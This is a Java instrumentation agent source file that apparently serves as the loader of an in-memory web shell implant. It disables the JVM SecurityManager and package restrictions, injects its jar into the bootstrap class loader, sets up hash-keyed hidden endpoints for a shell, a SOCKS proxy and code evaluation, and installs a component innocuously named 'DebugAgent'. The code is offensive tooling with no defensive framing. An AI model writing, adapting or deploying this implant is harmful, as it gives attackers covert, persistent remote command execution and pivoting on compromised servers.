import java.lang.instrument.Instrumentation;
import java.lang.instrument.ClassDefinition;
import java.util.jar.JarFile;
import java.util.Properties;
import java.util.Map;
import java.util.HashMap;
import java.util.jar.JarFile;
import java.io.File;


public class Agent {
    public static String SOCKS_URL = "";
    public static String SHELL_URL = "";
    public static String EVAL_URL = "";
    public static boolean WS_REGISTERED = false;

    private static void turnOffSecurity() {
        /*
         * Test if we're inside an applet. We should be inside
         * an applet if the System property ("package.restrict.access.sun")
         * is not null and is set to true.
         */

        boolean restricted = System.getProperty("package.restrict.access.sun") != null;

        /*
         * If we're in an applet, we need to change the System properties so
         * as to avoid class restrictions. We go through the current properties
         * and remove anything related to package restriction.
         */
        if ( restricted ) {

            Properties newProps = new Properties();

            Properties sysProps = System.getProperties();

            for(String prop : sysProps.stringPropertyNames()) {
                if ( prop != null && ! prop.startsWith("package.restrict.") ) {
                    newProps.setProperty(prop,sysProps.getProperty(prop));
                }
            }

            System.setProperties(newProps);
        }

        /*
         * Should be the final nail in (your) coffin.
         */
        System.setSecurityManager(null);
    }

    public static void agentmain(String hash, Instrumentation instrumentation) throws Exception {
        turnOffSecurity();

        JarFile jf = new JarFile(new File(Agent.class.getProtectionDomain().getCodeSource().getLocation()
                .toURI()));

        instrumentation.appendToBootstrapClassLoaderSearch(jf);

        SHELL_URL = "/".concat(hash).concat("_sh");
        SOCKS_URL = "/".concat(hash).concat("_socks");
        EVAL_URL = "/".concat(hash).concat("_eval");

        Class agentClass = Class.forName("DebugAgent");
        agentClass.getMethod(
                "install", Instrumentation.class
                ).invoke(null, instrumentation);
    }

    public static Class findClass(Instrumentation instrumentation, String className) throws Exception {
        try {
            return Class.forName(className);
        } catch (Exception ex) {
        }
        // otherwise iterate all loaded classes and find what we want
        for(Class<?> clazz: instrumentation.getAllLoadedClasses()) {
            if(clazz.getName().equals(className)) 
                return clazz;
        }
        return null;
    }



    public static void main(String[] args) {
    }
}
